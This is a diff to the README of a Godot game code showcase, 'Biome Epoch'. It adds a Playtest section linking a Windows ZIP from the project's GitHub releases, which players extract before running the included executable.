@@ -6,6 +6,10 @@ Code showcase for **Biome Epoch (群落纪元)**, a Godot 4.7 2.5D survival, bui
 
 Players explore a procedurally generated world, collect resources, build facilities, manage a party and base creatures, and coordinate construction, production, and hauling work. This repository is a deliberately small, review-friendly selection of the original project's implementation code; it is not a runnable game build.
 
+## Playtest
+
+**Windows x86_64:** Download [Biome Epoch Playtest v0.1.0](https://github.com/hanyanzeduck/biome-epoch-showcase/releases/download/v0.1.0/fera.zip), extract the ZIP, then run `fera.exe`.
+
 ## Gameplay Systems
 
 - Resource gathering, construction placement, production, storage, and hauling.
